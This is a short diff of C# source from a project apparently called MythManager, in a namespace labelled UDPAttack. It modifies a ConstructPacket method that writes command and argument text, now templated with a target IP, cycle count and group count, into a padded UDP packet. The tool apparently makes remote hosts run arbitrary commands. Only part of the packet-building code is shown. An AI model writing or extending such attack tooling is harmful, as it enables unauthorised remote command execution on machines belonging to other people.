@@ -16,7 +16,7 @@ namespace MythManager.Pages.UDPAttack.AttackFunctions
         {
             InitializeComponent();
         }
-        public AttackPacket ConstructPacket(ref string message)
+        public AttackPacket ConstructPacket(ref string message, string ip, int cycleCount, int groupCount)
         {
             byte[] packet;
             using (MemoryStream memoryStream = new MemoryStream())
@@ -45,7 +45,7 @@ namespace MythManager.Pages.UDPAttack.AttackFunctions
                 memoryStream.Write(payloadBytes, 0, payloadBytes.Length);
 
                 // Command text bytes
-                byte[] commandBytes = Encoding.Unicode.GetBytes(this.Command.Text);
+                byte[] commandBytes = Encoding.Unicode.GetBytes(AttackPacket.FormatString(Command.Text, ip, cycleCount, groupCount));
                 memoryStream.Write(commandBytes, 0, commandBytes.Length);
 
                 // Padding to 572 bytes
@@ -61,7 +61,7 @@ namespace MythManager.Pages.UDPAttack.AttackFunctions
                 }
 
                 // Arguments text bytes
-                byte[] argumentBytes = Encoding.Unicode.GetBytes(this.Arguments.Text);
+                byte[] argumentBytes = Encoding.Unicode.GetBytes(AttackPacket.FormatString(Arguments.Text, ip, cycleCount, groupCount));
                 memoryStream.Write(argumentBytes, 0, argumentBytes.Length);
 
                 // Padding to 906 bytes
